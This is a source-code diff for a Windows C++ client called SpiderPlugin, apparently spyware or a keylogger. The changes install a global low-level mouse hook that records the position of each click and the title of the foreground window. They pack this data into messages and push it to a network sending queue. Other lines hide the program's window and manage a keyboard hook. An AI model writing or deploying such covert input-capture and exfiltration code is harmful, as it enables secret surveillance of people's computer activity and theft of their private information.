@@ -8,6 +8,7 @@
 #include <cstdint>
 #include "SpiderPlugin.h"
 #include "MacAddr.h"
+#include "keys.h"
 
 #include <iostream> // TODO: rm
 
@@ -17,6 +18,7 @@ namespace client
 {
 namespace library
 {
+
 bool SpiderPlugin::initWindows()
 {
 	// Hide window
@@ -204,34 +206,54 @@ LRESULT CALLBACK SpiderPlugin::mouseHookWindows(int nCode, WPARAM wParam, LPARAM
 {
 	if (nCode == HC_ACTION)
 	{
-		bool printPos = false;
+		bool getPos = false;
+		spider::client::SystemMsg msg;
 		std::array<char, MAX_PATH> currentWindow;
 
-		GetWindowTextA(GetForegroundWindow(), currentWindow.data(), sizeof(currentWindow));
+		msg.type = spider::client::SystemMsgType::EventMouse;
 		switch (wParam)
 		{
 		case WM_LBUTTONDOWN:
-			std::cout << "Mouse Left Click [DOWN]";
-			printPos = true;
+			getPos = true;
+			msg.event.key = static_cast<std::uint32_t>(MouseButton::ButtonLeft);
+			msg.event.state = SystemMsgEventState::Down;
 			break;
 		case WM_LBUTTONUP:
-			std::cout << "Mouse Left Click [UP]";
-			printPos = true;
+			getPos = true;
+			msg.event.key = static_cast<std::uint32_t>(MouseButton::ButtonLeft);
+			msg.event.state = SystemMsgEventState::Up;
 			break;
 		case WM_RBUTTONDOWN:
-			std::cout << "Mouse Right Click [DOWN]";
-			printPos = true;
+			getPos = true;
+			msg.event.key = static_cast<std::uint32_t>(MouseButton::ButtonRight);
+			msg.event.state = SystemMsgEventState::Down;
 			break;
 		case WM_RBUTTONUP:
-			std::cout << "Mouse Right Click [UP]";
-			printPos = true;
+			getPos = true;
+			msg.event.key = static_cast<std::uint32_t>(MouseButton::ButtonRight);
+			msg.event.state = SystemMsgEventState::Up;
 			break;
 		default:
 			break;
 		}
-		if (printPos)
+		if (getPos)
 		{
-			std::cout << " X: " << reinterpret_cast<PMSLLHOOKSTRUCT>(lParam)->pt.x << " | Y: " << reinterpret_cast<PMSLLHOOKSTRUCT>(lParam)->pt.y << "[" << currentWindow.data() << "]" << std::endl;
+			GetWindowTextA(GetForegroundWindow(), currentWindow.data(), sizeof(currentWindow));
+			std::string cur(currentWindow.data());
+			std::size_t found = cur.find_last_of("/\\");
+			std::string filename = cur.substr(found + 1);
+
+			if (filename.length() > sizeof(msg.currentWindow))
+			{
+				filename.resize(sizeof(msg.currentWindow) - 1);
+			}
+			msg.currentWindow.fill(0);
+			std::copy(filename.begin(), filename.end(), msg.currentWindow.data());
+			msg.event.posX = reinterpret_cast<PMSLLHOOKSTRUCT>(lParam)->pt.x;
+			msg.event.posY = reinterpret_cast<PMSLLHOOKSTRUCT>(lParam)->pt.y;
+
+			std::cout << "Mouse Event: " << msg.event.posX << " | " << msg.event.posY << " in " << msg.currentWindow.data() << std::endl;
+			SpiderPlugin::m_sendToNetwork->push(msg);
 		}
 	}
 	return CallNextHookEx(NULL, nCode, wParam, lParam);
@@ -261,13 +283,12 @@ bool SpiderPlugin::unHookKeyboardWindows()
 
 bool SpiderPlugin::hookMouseWindows()
 {
-#if 1
+	// Install global hook
 	m_mouseHookWin = SetWindowsHookEx(WH_MOUSE_LL, mouseHookWindows, 0, 0);
 	if (!m_mouseHookWin)
 	{
 		return false;
 	}
-#endif
 	return true;
 }
 
@@ -295,23 +316,6 @@ void SpiderPlugin::runWindows() const
 		TranslateMessage(&msg);
 		DispatchMessage(&msg);
 	}
-#if 0
-	if (m_mouseHook)
-	{
-		POINT p;
-
-		GetCursorPos(&p);
-		std::cout << "Mouse X: " << p.x << " | Y: " << p.y << std::endl;
-		if (GetAsyncKeyState(VK_LBUTTON) & 0x8000)
-		{
-			std::cout << "Mouse left click" << std::endl;
-		}
-		if (GetAsyncKeyState(VK_RBUTTON) & 0x8000)
-		{
-			std::cout << "Mouse right click" << std::endl;
-		}
-	}
-#endif
 }
 }
 }
